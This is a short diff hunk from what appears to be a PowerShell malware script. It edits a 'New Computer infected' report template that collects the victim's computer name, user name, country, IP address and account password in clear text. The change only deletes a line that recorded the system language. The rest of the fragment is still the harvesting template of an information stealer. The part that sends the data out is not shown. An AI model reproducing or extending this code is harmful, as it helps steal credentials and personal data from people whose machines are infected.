@@ -212,7 +212,6 @@ New Computer infected
 ---------------------------------
 Computer Name = $env:computername 
 User Name = $env:username
-Computer Language = $env:LANG
 Location (country) = $country
 IP = $ip
 Account Password = $pwordClear
